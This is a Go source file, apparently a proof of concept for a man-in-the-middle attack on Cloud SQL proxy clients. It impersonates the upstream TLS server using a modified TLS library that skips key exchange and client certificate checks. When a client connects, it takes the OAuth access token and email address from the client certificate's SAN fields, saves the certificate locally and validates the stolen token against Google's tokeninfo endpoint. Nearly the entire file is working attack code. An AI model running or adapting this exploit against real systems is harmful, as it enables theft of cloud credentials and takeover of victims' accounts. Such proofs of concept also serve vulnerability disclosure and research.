package main

import (
	"log"
    "net"
    "os"
	"fmt"
	"regexp"

	"io/ioutil"
	"crypto/x509"
	"encoding/asn1"
	"net/http"
	
	"github.com/irsl/cloudsql-proxy-mitm-poc/tls"
)

const (
    CONN_HOST = "0.0.0.0"
    CONN_PORT = "3307"
    CONN_TYPE = "tcp"
)

type RawHandshakeInfo struct {
	Certificates [][]byte
	AcceptableCAs [][]byte
}

var access_token_regex *regexp.Regexp

func getCertificateAndAcceptableCAsFromTLSServer(upstream string) (*RawHandshakeInfo, error) {
    var acceptablecas [][]byte
	var serverCertificates [][]byte
    conf := &tls.Config{
        InsecureSkipVerify: true,
		MaxVersion: tls.VersionTLS12,
		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
			log.Printf("We are in VerifyPeerCertificate of the TLS client. len(rawCerts): %d, len(verifiedChains): %d", len(rawCerts), len(verifiedChains))
			serverCertificates = rawCerts
			return nil
		},
		GetClientCertificate: func(cri *tls.CertificateRequestInfo) (*tls.Certificate, error) {
		    log.Printf("The server wants a client certificate")
			acceptablecas = cri.AcceptableCAs
			/*
		    for i, dn := range cri.AcceptableCAs {
			    log.Printf("DN %d: %s", i, string(dn))
			}
			*/
			log.Printf("Saved %d AcceptableCAs for later use\n", len(acceptablecas))
			return nil, fmt.Errorf("nope") // we need to break the connection
		},
    }
	
	log.Printf("Connecting to %s to obtain info about the TLS setup", upstream)
    conn, err := tls.Dial("tcp", upstream, conf)
	if conn != nil {
		defer conn.Close()	
	}
	if acceptablecas != nil && serverCertificates != nil {
		err = nil
	}
	
	details := RawHandshakeInfo{
		AcceptableCAs: acceptablecas,
		Certificates: serverCertificates,
	}
	
	return &details, err
}

func main() {
    if len(os.Args) != 2 {
	   log.Fatalf("Usage: %s upstreamaddress\nExample: %s 123.123.123.123:3307", os.Args[0], os.Args[0])
	}
	
	upstream := os.Args[1]
	
	rawHandshakeDetails, err := getCertificateAndAcceptableCAsFromTLSServer(upstream) // 
	if err != nil {
		log.Fatalf("Error obtaining TLS info: %s", err)
	}
	
	access_token_regex, err = regexp.Compile(`ya\d+[\.a-zA-Z0-9_\-]+`)
	if err != nil {
		panic(err)		
	}

	
    // Listen for incoming connections.
    l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
    if err != nil {
        log.Fatalf("Error listening:", err.Error())
    }
    // Close the listener when the application closes.
    defer l.Close()
    log.Printf("Listening on %s:%s", CONN_HOST, CONN_PORT)
    for {
        // Listen for an incoming connection.
        conn, err := l.Accept()
        if err != nil {
            log.Fatalf("Error accepting: %s", err.Error())
        }
        // Handle connections in a new goroutine.
        go handleRequest(conn, rawHandshakeDetails)
    }
}




// Handles incoming requests.
func handleRequest(conn_client net.Conn, rawHandshake *RawHandshakeInfo) {
  defer conn_client.Close()

  log.Printf("New connection from %s, trying the TLS handshake", conn_client.RemoteAddr().String())

  
  conf := &tls.Config{
        InsecureSkipVerify: true,
		MaxVersion: tls.VersionTLS12,		
		AcceptableCAs: rawHandshake.AcceptableCAs, 
		ClientAuth: tls.RequireAndVerifyClientCert,
		Certificates: []tls.Certificate {
			tls.Certificate{
			    Certificate: rawHandshake.Certificates,
			},
		},
		SkipKeyexchange: true,
		SkipClientCertificateVerification: true, // we don't have the root CA certificates, so let's accept everything rather
		
		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
		    // success, this is the primary goal of this attack :)
			log.Printf("We are in VerifyPeerCertificate of the TLS server. len(rawCerts): %d, len(verifiedChains): %d", len(rawCerts), len(verifiedChains))
			cert, err := x509.ParseCertificate(rawCerts[0])
			if err != nil {
			   return err
			}
			log.Printf("The client sent a certificate!\nSubject: %s\nIssuer: %s\n\n", cert.Subject.String(), cert.Issuer.String()) //rawCerts[0]
			log.Println("  DNS SANs:")
			for i, d:= range cert.DNSNames {
			   log.Printf("    #%d: %s", i, d)
			}
			log.Println("  EmailAddresses:")
			for i, d:= range cert.EmailAddresses {
			   log.Printf("    #%d: %s", i, d)
			}
			log.Println("  IPAddresses:")
			for i, d:= range cert.IPAddresses {
			   log.Printf("    #%d: %s", i, d.String())
			}
			log.Println("  URIs:")
			for i, d:= range cert.URIs {
			   log.Printf("    #%d: %s", i, d.String())
			}
			
			for _, ext:= range cert.Extensions {	   
			   if ext.Id.String() != "2.5.29.17" { // SAN
				   continue
			   }
			   log.Println("SAN extension found\n")
			   // log.Printf("Value: %s\n", ext.Value)

			   var raw asn1.RawValue
			   _, err := asn1.Unmarshal(ext.Value, &raw)
			   if err != nil {
				  log.Fatal(err)
			   }
				   
			   if raw.Tag != asn1.TagSequence {
				  continue
			   }
				   
			   rest := raw.Bytes
			   for {
				  rest, err = asn1.Unmarshal(rest, &raw)
				  if err != nil {
					  log.Fatal(err)
				  }
				  
				  if raw.Tag == 0 {// othername
					 
					 match := access_token_regex.Find(raw.Bytes)
					 if match != nil {
						access_token := string(match)
						log.Printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! access_token: %s", access_token)
						
						resp, err := http.Get("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token="+access_token)
						if err != nil {
							log.Printf("Unable to obtain info about the access token... %s", err)
						} else {
							defer resp.Body.Close()
							body, _ := ioutil.ReadAll(resp.Body)
							log.Print(string(body))
						}
					 } else {
						 log.Println("even though we got the certificate, we couldn't find the access token inside. Take a look at the certificate saved locally")
					 }
					 
				  }
				  if raw.Tag == 1 {// email
				     email := string(raw.Bytes)
				     log.Printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! username: %s\n", email)

					 cert_filename := email+".der"
					 ioutil.WriteFile(cert_filename, rawCerts[0], 0644)
					 log.Printf("A copy of the certificate saved locally: %s", cert_filename)
					 
				  }
				  
				  if rest == nil || len(rest) == 0 {
					  break
				  }
			   }
			   
			}
			
			return nil
		},
  }

  tls_conn := tls.Server(conn_client, conf)
  
  err := tls_conn.Handshake()
  if err != nil {
	    log.Print(err)
		return
  }
  
}
